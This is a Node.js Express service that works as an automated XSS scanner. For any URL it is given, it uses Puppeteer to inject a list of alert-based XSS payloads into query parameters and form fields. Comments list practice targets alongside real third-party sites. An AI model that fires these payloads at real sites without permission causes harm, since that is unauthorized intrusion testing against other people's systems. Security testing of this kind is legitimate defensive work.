const http = require('http');
const express = require('express');
const bodyParser = require('body-parser');
const queryString = require('query-string');
const puppeteer = require('puppeteer');

const app = express();
const server = http.createServer(app);
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public'));

app.get('/', async (req, res) => {
  res.sendfile(__dirname + '/public/index.html');
});

app.get('/scanner', async (req, res) => {
  let globalURL = req.query.url;
  console.log('get request');
  let hasXSS = await check_xss(globalURL);
  console.log(hasXSS)
  res.send(hasXSS);
});

const MALICIOUS_SCRIPT = [
  '<script>alert("xss")</script>',
  '<image src=1 href=1 onerror="javascript:alert(1)"></image>',
  "')%3Balert(1)%3Bvar b=('",
  '<iframe onReadyStateChange iframe onReadyStateChange="javascript:javascript:alert(1)"></iframe onReadyStateChange>',
  '<html onMouseOut html onMouseOut="javascript:javascript:alert(1)"></html onMouseOut>',
  '<img src="http://inexist.ent" onerror="javascript:alert(1)"/>',
  'ABC<div style="x:\xE2\x80\x81expression(javascript:alert(1)">DEF',
  '\x3Cscript>javascript:alert(1)</script>',
  '<html onmousemove html onmousemove="javascript:javascript:alert(1)"></html onmousemove>',
];

async function check_xss(url) {
  const browser = await puppeteer.launch({
    args: [
        '--no-sandbox',
        '--disable-setuid-sandbox'
    ]
});
  const page = await browser.newPage();
  await page.goto(url, { waitUntil: 'networkidle2' });
  const formsArray = await page.$$('form');
  const page2 = await browser.newPage();
  let isVulnerable = false;
  page2.on('dialog', async (dialog) => {
    isVulnerable = true;
    dialog.accept();
  });
  for (script in MALICIOUS_SCRIPT) {
    let newUrl = check_url(url, MALICIOUS_SCRIPT[script]);
    console.log(newUrl)
    if (newUrl != '') {
      await page2.goto(newUrl);
    }
    if (isVulnerable) {
      browser.close();
      return true;
    }
    for (i in formsArray) {
      try {
        await page2.goto(url, { waitUntil: 'networkidle2', timeout: 60000 });
        // const select = await page.waitForSelector('input[type="text"]', {visible: true, timeout: 3000 });
        let inputsArray = await formsArray[
          i
        ].$$eval(
          'input[type="text"]',
          (inputs) =>
            inputs.map((input) => (input.id ? '#' + input.id : input.className ? ('.' + input.className) : false))
        );
        console.log("yo")
        console.log(inputsArray)
        for (input in inputsArray) {
          if(!inputsArray[input]){
            browser.close();
            return false;
          }
          let selector = inputsArray[input];
          if (selector.charAt(0) == '.') {
            selector = selector.split(' ');
          }
          await page2.type(selector, MALICIOUS_SCRIPT[script], { delay: 20 });
        }
        console.log("ko")
        let btnsArray = await formsArray[
          i
        ].$$eval('input[type="submit"],button[type="submit"]', (subs) =>
          subs.map((sub) => (sub.id ? '#' + sub.id : sub.className ? ('.' + sub.className) : false ))
        );
        console.log("so")
        console.log(btnsArray)
        let btn = btnsArray[0];
        console.log(btn)
        await page2.click(btn);
        console.log("okkk")
        newUrl = check_url(page2.url(), MALICIOUS_SCRIPT[script]);
        console.log(newUrl)
        if (newUrl != '') {
          await page2.goto(newUrl);
        }
      } catch (error) {
        console.log(error)
        browser.close();
        return error.message;
      }
    }
    await new Promise((resolve) => setTimeout(resolve, 2000));
    if (isVulnerable) {
      browser.close();
      return true;
    }
  }
  browser.close();
  await new Promise((resolve) => setTimeout(resolve, 2000));
  if (!isVulnerable) {
    return false;
  } else {
    return true;
  }
}

const check_url = (url, script) => {
  let temp = {};
  let newUrl = '';
  temp = url.split('?');
  let tmp = queryString.parse(temp[1]);
  let key = Object.keys(tmp);
  if (temp[1]) {
    newUrl = temp[0] + '?';
    for (let k in tmp) {
      if (key[0] === k) {
        newUrl = newUrl + k + '=' + script;
      } else {
        newUrl = newUrl + '&' + k + '=' + script;
      }
    }
  }
  return newUrl;
};

server.listen(process.env.PORT || 3030, () =>
  console.log(`Server has started at 3030.`)
);

// https://xss-game.appspot.com/level1/frame
// https://xss-game.appspot.com/level2/frame
// https://xss-game.appspot.com/level4/frame
// https://www.wikipedia.org
//  https://gibiru.com/
